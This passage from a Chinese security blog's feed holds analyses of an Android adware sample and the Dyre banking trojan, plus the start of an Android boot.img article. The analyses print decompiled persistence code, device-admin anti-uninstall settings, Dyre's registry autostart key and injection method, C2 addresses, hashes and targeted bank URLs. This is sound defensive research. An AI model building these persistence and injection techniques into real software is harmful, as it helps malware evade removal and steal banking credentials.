class="hljs-tag">&lt;<span class="hljs-name">meta-data</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.app.device_admin&quot;</span> <span class="hljs-attr">android:resource</span>=<span class="hljs-string">&quot;@xml/lockourscreen&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.app.action.DEVICE_ADMIN_ENABLED&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br></code></pre></td></tr></table></figure><p>lockourscreen.xml 里申请了锁屏权限</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">device-admin</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">uses-policies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">force-lock</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">uses-policies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">device-admin</span>&gt;</span><br></code></pre></td></tr></table></figure><p>但是Receiver里什么也没有干，这只是为了阻止普通用户卸载app。</p><p><img src="http://1.bp.blogspot.com/-53HqGYuFduk/Vihzxsi5X-I/AAAAAAAABag/6RFUpBw0cgc/s1600/2015-10-22_09-27-10.png" alt="lock screen"></p><p>样本会访问下面URL 获得ip地址信息 <a href="http://ip.taobao.com/service/getIpInfo2.php?ip=myip">http://ip.taobao.com/service/getIpInfo2.php?ip=myip</a></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs avrasm">&#123;<br><span class="hljs-symbol">code:</span> <span class="hljs-number">0</span>,<br><span class="hljs-symbol">data:</span> &#123;<br><span class="hljs-symbol">country:</span> <span class="hljs-string">&quot;中国&quot;</span>,<br><span class="hljs-symbol">country_id:</span> <span class="hljs-string">&quot;CN&quot;</span>,<br><span class="hljs-symbol">area:</span> <span class="hljs-string">&quot;华北&quot;</span>,<br><span class="hljs-symbol">area_id:</span> <span class="hljs-string">&quot;100000&quot;</span>,<br><span class="hljs-symbol">region:</span> <span class="hljs-string">&quot;北京市&quot;</span>,<br><span class="hljs-symbol">region_id:</span> <span class="hljs-string">&quot;110000&quot;</span>,<br><span class="hljs-symbol">city:</span> <span class="hljs-string">&quot;北京市&quot;</span>,<br><span class="hljs-symbol">city_id:</span> <span class="hljs-string">&quot;110100&quot;</span>,<br><span class="hljs-symbol">county:</span> <span class="hljs-string">&quot;&quot;</span>,<br><span class="hljs-symbol">county_id:</span> <span class="hljs-string">&quot;-1&quot;</span>,<br><span class="hljs-symbol">isp:</span> <span class="hljs-string">&quot;华瑞信通&quot;</span>,<br><span class="hljs-symbol">isp_id:</span> <span class="hljs-string">&quot;1000146&quot;</span>,<br><span class="hljs-symbol">ip:</span> <span class="hljs-string">&quot;220.231.27.156&quot;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从分析看样本主要是获取广告，下载apk，安装apk 这几个功能，还可以使用浏览器打开指定URL</p><h2 id="daemon-分析"><a href="#daemon-分析" class="headerlink" title="daemon 分析"></a>daemon 分析</h2><p>两个服务中，daemon 是 arm elf 可执行文件，app安装后自动执行。daemon程序由 dz.jar 的 assets&#x2F;oilive 释放出来。 在手机上得到下面的命令行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">/data/data/org.dz.passion.browser/app_bin/daemon -p org.dz.passion.browser -s net.tend.dot.DZK -t 120<br></code></pre></td></tr></table></figure><p>daemon 使用说明</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usage: %s -p package-name -s daemon-service-name -t interval-time<br></code></pre></td></tr></table></figure><p>daemon 进程的父进程是init，结束应用进程不会结束daemon进程，将应用进程结束后过120秒，daemon将会重新自动启动 服务程序。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">u0_a45</span>    <span class="hljs-number">999</span>   <span class="hljs-number">36</span>    <span class="hljs-number">193564</span> <span class="hljs-number">32452</span> ffffffff <span class="hljs-number">40033</span>a40 S org.dz.passion.browser:daemon<br><span class="hljs-attribute">u0_a45</span>    <span class="hljs-number">1016</span>  <span class="hljs-number">36</span>    <span class="hljs-number">192640</span> <span class="hljs-number">35772</span> ffffffff <span class="hljs-number">40033</span>a40 S org.dz.passion.browser<br><span class="hljs-attribute">u0_a45</span>    <span class="hljs-number">1028</span>  <span class="hljs-number">1</span>     <span class="hljs-number">728</span>    <span class="hljs-number">296</span>   c0099f1c <span class="hljs-number">40032</span>c88 S /data/data/org.dz.passion.browser/app_bin/daemon<br></code></pre></td></tr></table></figure><p>这个搞法似类以前的双进程监控，不容易干掉，上面说过启动App就启动两个服务 DZS 和 DZK，而DZK的代码其实在MFKS中， 从下面的代码可以看到，MFKS在Service 的 OnCreate 是就把daemon 运行起来了，daemon 又会检查app的服务的状态，有会自动 启动服务，比较流氓啊！这么做目的还是为了常驻手机，长期运行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MFKS</span> &#123;<br>    <span class="hljs-keyword">private</span> Service service;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MFKS</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> IBinder <span class="hljs-title function_">onBind</span><span class="hljs-params">(Intent arg2)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">()</span> &#123;<br>        run_daemon.install(<span class="hljs-built_in">this</span>.service.getApplicationContext(), config.get_kvp_classObject(<span class="hljs-built_in">this</span>.service  <span class="hljs-comment">// net.tend.dot.DZK</span><br>                .getApplicationContext()), <span class="hljs-number">120</span>);<br>        <span class="hljs-built_in">this</span>.service.startService(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(<span class="hljs-built_in">this</span>.service.getApplicationContext(), config.get_svp_classObject(  <span class="hljs-comment">// net.tend.dot.DZS</span><br>                <span class="hljs-built_in">this</span>.service.getApplicationContext())));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onStart</span><span class="hljs-params">(Intent arg1, <span class="hljs-type">int</span> arg2)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setService</span><span class="hljs-params">(Service arg1)</span> &#123;<br>        <span class="hljs-built_in">this</span>.service = arg1;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><h3 id="访问的URL"><a href="#访问的URL" class="headerlink" title="访问的URL"></a>访问的URL</h3><p><a href="http://ip.taobao.com/service/getIpInfo2.php%3Fip%3Dmyip">http://ip.taobao.com/service/getIpInfo2.php%3Fip%3Dmyip</a><br><a href="http://api.nooobi.com/api-unlock/getlockappconfig">http://api.nooobi.com/api-unlock/getlockappconfig</a><br><a href="http://api.nooobi.com/api-unlock/insertimei">http://api.nooobi.com/api-unlock/insertimei</a><br><a href="http://mob.s2s.nooobi.com/api-mobvista/sdkback%3Fappkey%3DSexTubeMobvista1">http://mob.s2s.nooobi.com/api-mobvista/sdkback%3Fappkey%3DSexTubeMobvista1</a><br><a href="http://api.nooobi.com/api-unlock/getapptype">http://api.nooobi.com/api-unlock/getapptype</a><br><a href="http://api.nooobi.com/api-unlock/kitup">http://api.nooobi.com/api-unlock/kitup</a><br><a href="http://alog.umeng.com/app_logs">http://alog.umeng.com/app_logs</a><br><a href="http://api.nooobi.com/api-unlock/getadlist">http://api.nooobi.com/api-unlock/getadlist</a><br><a href="http://dw.cnscns.com/upload/adIcon/2015-10-07/55c01eff-e66a-4186-9658-977d025c5395.png">http://dw.cnscns.com/upload/adIcon/2015-10-07/55c01eff-e66a-4186-9658-977d025c5395.png</a><br><a href="http://dw.cnscns.com/upload/adOnline/2015-10-07/db90fe85-dd23-4674-9bbc-767c978acb8c.jpg">http://dw.cnscns.com/upload/adOnline/2015-10-07/db90fe85-dd23-4674-9bbc-767c978acb8c.jpg</a><br><a href="http://dw.cnscns.com/upload/adIcon/2015-09-06/eccb1bfd-7c3a-44a3-bfc8-e559eb995b49.png">http://dw.cnscns.com/upload/adIcon/2015-09-06/eccb1bfd-7c3a-44a3-bfc8-e559eb995b49.png</a><br><a href="http://dw.cnscns.com/upload/adOnline/2015-09-06/2cd2516c-6f55-4d99-8913-e121fd34abbd.jpg">http://dw.cnscns.com/upload/adOnline/2015-09-06/2cd2516c-6f55-4d99-8913-e121fd34abbd.jpg</a><br><a href="http://dw.cnscns.com/upload/adIcon/2015-06-18/a7a41435-51e6-4a02-8bb5-1d96edf1a403.png">http://dw.cnscns.com/upload/adIcon/2015-06-18/a7a41435-51e6-4a02-8bb5-1d96edf1a403.png</a><br><a href="http://dw.cnscns.com/upload/adOnline/2015-09-19/2e3fe3ec-8043-4a03-ac6d-6b815dc2c144.jpg">http://dw.cnscns.com/upload/adOnline/2015-09-19/2e3fe3ec-8043-4a03-ac6d-6b815dc2c144.jpg</a><br><a href="http://api.nooobi.com/api-unlock/unlockaction">http://api.nooobi.com/api-unlock/unlockaction</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>DZSM 这个样本使用了动态加载dex的技术，使得其检测更加困难。代码结构良好，异常处理充分， 是一个专业程序员的作品。使用了简单的加密技术，也是为了逃避检查。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Malware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dyre 简单分析</title>
    <link href="/cn/malware_Dyre/"/>
    <url>/cn/malware_Dyre/</url>
    
    <content type="html"><![CDATA[<h2 id="0-概述"><a href="#0-概述" class="headerlink" title="0. 概述"></a>0. 概述</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">sha256   : 523<span class="hljs-type">b9e8057ef0905e2c7d51b742d4be9374cf2eee5a810f05d987604847c549d</span><br>md5      : <span class="hljs-type">c2d73485095efdbd7ab625e469affb11</span><br>filename : <span class="hljs-type">Invoice_00739287.scr</span><br></code></pre></td></tr></table></figure><p>脱壳后的程序中可以看到 C:\CPP_PROJECTS_GIT\DYRE\x64\Release\dyrecontroller.pdb 因此大多数杀软将样本命名为dyre。Dyre的主要目标为在线银行。样本看上去是一个PDF文件，其实则是使用scr后缀的可执行文件，引诱受害者点击文件。</p><p>Dyre的一些其他样本 MD5：</p><ul><li>999bc5e16312db6abff5f6c9e54c546f</li><li>b44634d90a9ff2ed8a9d0304c11bf612</li><li>dd207384b31d118745ebc83203a4b04a</li></ul><h2 id="1-感染与传播"><a href="#1-感染与传播" class="headerlink" title="1. 感染与传播"></a>1. 感染与传播</h2><p>从网上的公开资料来看，样本主要传播途径为钓鱼邮件。</p><p><img src="http://2.bp.blogspot.com/-AyJ8UbhJvUM/VfrX9MpDSPI/AAAAAAAABQg/22nJydJKjOs/s400/Figure-21.png" alt="fishing"></p><h2 id="2-工作流程"><a href="#2-工作流程" class="headerlink" title="2. 工作流程"></a>2. 工作流程</h2><ul><li>复制自身 (C:\Documents and Settings\user\Application Data\googleupdaterr.exe)</li><li>执行复本文件</li><li>删除自身</li><li>注入Explorer 进程</li><li>googleupdaterr.exe 进程退出</li></ul><p>由于注入Explorer后，进程退出，在任务管理器中看不到任何可疑进程，代码在Explorer中 执行。Dyre 通过写注册表启动项实现自启动，系统启动后将自动执行恶意文件。</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">key   : HKLM\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\GoogleUpdate<br>value : <span class="hljs-name">C</span>:\Documents <span class="hljs-keyword">and</span> Settings\sys\Application Data\googleupdaterr.exe<br></code></pre></td></tr></table></figure><h2 id="3-网络协议"><a href="#3-网络协议" class="headerlink" title="3. 网络协议"></a>3. 网络协议</h2><p>由于时间较长了，url链接基本都访问不了了，所以这部分内容就不重点说了。<br><a href="http://192.99.6.61/cho1017/W512600.19532DF60D132DC4E0153BE41218BD1A/5/publickey/">http://192.99.6.61/cho1017/W512600.19532DF60D132DC4E0153BE41218BD1A/5/publickey/</a><br>217.12.207.151:8900 和 192.99.6.61:80 都已失效。</p><p>可以参考下面这篇文章的图片</p><p><a href="http://phishme.com/project-dyre-new-rat-slurps-bank-credentials-bypasses-ssl/">Project Dyre: New RAT Slurps Bank Credentials, Bypasses SSL</a></p><p>VirusTotal 的Passive DNS 可以也可以看到一些内容</p><p><img src="http://2.bp.blogspot.com/-7qnGX4wX1Jo/Vfrgw5tHK0I/AAAAAAAABQw/JVXCbacLraA/s640/%25E5%25B1%258F%25E5%25B9%2595%25E5%25BF%25AB%25E7%2585%25A7%2B2015-09-17%2B%25E4%25B8%258B%25E5%258D%258811.44.25.png" alt="virusTotal"></p><p>从链接提供的内容来看，Dyre使用HTTP协议来进行C&amp;C通讯，C&amp;C服务器的IP在代码中硬编码。</p><h2 id="4-高级技术"><a href="#4-高级技术" class="headerlink" title="4. 高级技术"></a>4. 高级技术</h2><h3 id="4-1-脱壳"><a href="#4-1-脱壳" class="headerlink" title="4.1 脱壳"></a>4.1 脱壳</h3><p>这个样本使用了反混淆技术，不仔细看的话就像一个正常的MFC程序，其实运行到一定阶段， 进程空间里所有的代码都被替换。脱壳过程中未发现反调试的现象，OEP应该是4021F0，在OD里设置硬件执行断点，F9就可以dump了，修复IAT后可以正常运行。</p><h3 id="4-2-进程注入"><a href="#4-2-进程注入" class="headerlink" title="4.2 进程注入"></a>4.2 进程注入</h3><p>我们的目标代码应该是注入到 Explorer 中的代码。其实脱壳后的样本的资源文件里包含了注入到Explorer的代码，分别是PAYLOAD32和PAYLOAD64.</p><p><img src="http://3.bp.blogspot.com/-C3jyE4a0hCM/VfqDzC5jqgI/AAAAAAAABPw/91b98B1dHmQ/s640/payload.png" alt="resources"></p><p>Dyre的进程注入和一般的样本有一定的区别，使用了ZwQueueApcThread来启动，而并没有使ZwSetContextThread。在跨进程写则使用了ZwMapViewOfSection而没有使用大家熟悉的ZwWriteVirtualMemory，隐蔽性较强。</p><p><img src="http://4.bp.blogspot.com/-CMW6dQ5QppI/VfrQ455zqhI/AAAAAAAABQQ/5IcOj6LJQRE/s640/injection.png" alt="injection"></p><p>新版的Ollydbg 2.01， 支持调试子进程，在子进程中可以看到以下代码</p><p><img src="http://3.bp.blogspot.com/-eC45mc0InZw/VfqEHblwFgI/AAAAAAAABP4/DvoOTi-sIvc/s640/NtQueueApcThread.png" alt="OD2"><br><img src="http://1.bp.blogspot.com/-KWDSgO7N6VE/VfqEPgtwTPI/AAAAAAAABQA/udrCHhMNvOI/s640/027F0000.png" alt="OD2.1"></p><p>可以确认注入的确实是资源文件里的payload</p><h2 id="附录A"><a href="#附录A" class="headerlink" title="附录A"></a>附录A</h2><h3 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h3><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs mel">cashproonline.bankofamerica.com/AuthenticationFrameworkWeb/cpo/login/public/loginMain.faces<br>businessaccess.citibank.citigroup.com/cbusol/signon.<span class="hljs-keyword">do</span><br>www.bankline.natwest.com/CWSLogon/logon.<span class="hljs-keyword">do</span>?CTAuthMode=RBSG_CORP4P&amp;domain=.bankline.natwest.com&amp;ct-web-server-id=Internet&amp;CT_ORIG_URL=%2Fbankline%2Fnatwest%2Fdefault.jsp&amp;ct_orig_uri=https%3A%2F%2Fwww.bankline.natwest.com%3A443%2Fbankline%2Fnatwest%2Fdefault.jsp<br>www.bankline.rbs.com/CWSLogon/logon.<span class="hljs-keyword">do</span>?CTAuthMode=RBSG_CORP4P&amp;domain=.bankline.rbs.com&amp;ct-web-server-id=Internet&amp;CT_ORIG_URL=%2Fbankline%2Frbs%2Fdefault.jsp&amp;ct_orig_uri=https%3A%2F%2Fwww.bankline.rbs.com%3A443%2Fbankline%2Frbs%2Fdefault.jsp<br>www.bankline.ulsterbank.ie/CWSLogon/logon.<span class="hljs-keyword">do</span>?CTAuthMode=RBSG_CORP4P&amp;domain=.bankline.ulsterbank.ie&amp;ct-web-server-id=Internet&amp;CT_ORIG_URL=%2Fbankline%2Fubr%2Fdefault.jsp&amp;ct_orig_uri=https%3A%2F%2Fwww.bankline.ulsterbank.ie%3A443%2Fbankline%2Fubr%2Fdefault.jsp<br>TRUE<br>AUTOBACKCONN<br>%02x<br>cashproonline.bankofamerica.com/materials<br>user_id=<br>company_id=<br>businessaccess.citibank.citigroup.com/materials<br>business_code=<br>business_name=<br><span class="hljs-number">0</span>x%x<br><span class="hljs-number">85.25</span><span class="hljs-number">.148</span><span class="hljs-number">.6</span><br>c1shproonline.bankofamerica.com<br>cashproonline.bankofamerica.com/AuthenticationFrameworkWeb/<br>cashproonline.bankofamerica.com/assets/<br>b1sinessaccess.citibank.citigroup.com<br>businessaccess.citibank.citigroup.com/assets/<br>businessaccess.citibank.citigroup.com/CitiBusinessOnlineFiles/<br>www.b1nkline.natwest.com<br>www.bankline.natwest.com/<br>www.b1nkline.rbs.com<br>www.bankline.rbs.com/<br>www.b1nkline.ulsterbank.ie<br>www.bankline.ulsterbank.ie/<br></code></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.virustotal.com/en/file/dc276b0113694ecc62913311e2580857754aa890173dfaa9d95afad6396bb741/analysis/">https://www.virustotal.com/en/file/dc276b0113694ecc62913311e2580857754aa890173dfaa9d95afad6396bb741/analysis/</a><br><a href="https://www.fireeye.com/blog/threat-research/2015/07/dyre_banking_trojan.html">https://www.fireeye.com/blog/threat-research/2015/07/dyre_banking_trojan.html</a><br><a href="https://www.blueliv.com/downloads/documentation/reports/Network_insights_of_Dyre_and_Dridex_Trojan_bankers.pdf">https://www.blueliv.com/downloads/documentation/reports/Network_insights_of_Dyre_and_Dridex_Trojan_bankers.pdf</a><br><a href="https://portal.sec.ibm.com/mss/html/en_US/support_resources/pdf/Dyre_Wolf_MSS_Threat_Report.pdf">https://portal.sec.ibm.com/mss/html/en_US/support_resources/pdf/Dyre_Wolf_MSS_Threat_Report.pdf</a><br><a href="http://www.seculert.com/blog/2015/04/new-dyre-version-evades-sandboxes.html">http://www.seculert.com/blog/2015/04/new-dyre-version-evades-sandboxes.html</a><br><a href="https://blogs.cisco.com/security/talos/threat-spotlight-dyre">https://blogs.cisco.com/security/talos/threat-spotlight-dyre</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Malware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Android boot.img 格式分析</title>
    <link href="/cn/android_bootimg/"/>
    <url>/cn/android_bootimg/</url>
    
    <content type="html"><![CDATA[<p>首先需要搞到boot.img，网络上流传的方法是通过&#x2F;proc&#x2F;mtd 在获取需要的信息</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dts">&gt; ./adb shell<br>&gt; su<br>&gt; cat <span class="hljs-keyword">/proc/</span>mtd<br><span class="hljs-symbol"></span><br><span class="hljs-symbol">dev:</span>    size   erasesize  name<br><span class="hljs-symbol">mtd0:</span> <span class="hljs-number">00700000</span> <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;boot&quot;</span><br><span class="hljs-symbol">mtd1:</span> <span class="hljs-number">07</span>c20000 <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;cache&quot;</span><br><span class="hljs-symbol">mtd2:</span> <span class="hljs-number">00700000</span> <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;recovery&quot;</span><br><span class="hljs-symbol">mtd3:</span> <span class="hljs-number">00140000</span> <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;splash&quot;</span><br><span class="hljs-symbol">mtd4:</span> <span class="hljs-number">00700000</span> <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;FOTA_STO&quot;</span><br><span class="hljs-symbol">mtd5:</span> <span class="hljs-number">09e80000</span> <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;system&quot;</span><br><span class="hljs-symbol">mtd6:</span> <span class="hljs-number">0</span>a4e0000 <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;userdata&quot;</span><br><span class="hljs-symbol">mtd7:</span> <span class="hljs-number">00080000</span> <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;misc&quot;</span><br><span class="hljs-symbol">mtd8:</span> <span class="hljs-number">00180000</span> <span class="hljs-number">00020000</span> <span class="hljs-string">&quot;persist&quot;</span><br></code></pre></td></tr></table></figure><p>但是在Nexus4, Android 4.4.4 已经找不到这个文件了</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tcl">&gt; cat /<span class="hljs-keyword">proc</span>/mtd<span class="hljs-title"></span><br><span class="hljs-title"></span><br><span class="hljs-title">cat:</span> /<span class="hljs-keyword">proc</span>/mtd:<span class="hljs-title"> No</span> such<span class="hljs-title"> file</span> or<span class="hljs-title"> directory</span><br></code></pre></td></tr></table></figure><p>但是还是有方法可以获取到需要的信息。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">&gt; mount<br><br><span class="hljs-code">.....</span><br><span class="hljs-code">/dev/block/platform/msm_sdcc.1/by-name/system /system ext4 ro,seclabel,relatime,data=ordered 0 0</span><br><span class="hljs-code">/dev/block/platform/msm_sdcc.1/by-name/cache /cache ext4 rw,seclabel,nosuid,nodev,noatime,data=ordered 0 0</span><br><span class="hljs-code">.....</span><br></code></pre></td></tr></table></figure><p> 可以看到大致上面的输出（上面的输出省略了部分内容），从输出中可以看出 &#x2F;dev&#x2F;block&#x2F;platform&#x2F;msm_sdcc.1&#x2F;by-name<br>是一个比较有意思的路径，有by-name 的信息。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs xl">&gt; ls /dev/<span class="hljs-keyword">block</span>/platform/msm_sdcc.<span class="hljs-number">1</span>/<span class="hljs-keyword">by</span>-<span class="hljs-keyword">name</span>/<br><br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 DDR -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p24<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 aboot -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p12<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 abootb -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p15<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 boot -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p6<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 cache -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p22<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 grow -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p25<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 m9kefs1 -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p8<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 m9kefs2 -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p9<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 m9kefs3 -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p10<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 metadata -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p18<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 misc -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p19<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 modem -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p1<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 persist -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p20<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 recovery -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p7<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 rpm -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p11<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 rpmb -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p16<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 sbl1 -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p2<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 sbl2 -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p3<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 sbl2b -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p13<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 sbl3 -&gt;</span> /dev/<span class="hljs-keyword">block</span>/mmcblk0p4<br><span class="hljs-function"><span class="hljs-title">lrwxrwxrwx</span> root     root              2014-06-30 20:50 sbl3b -&gt;</span> /dev/<span 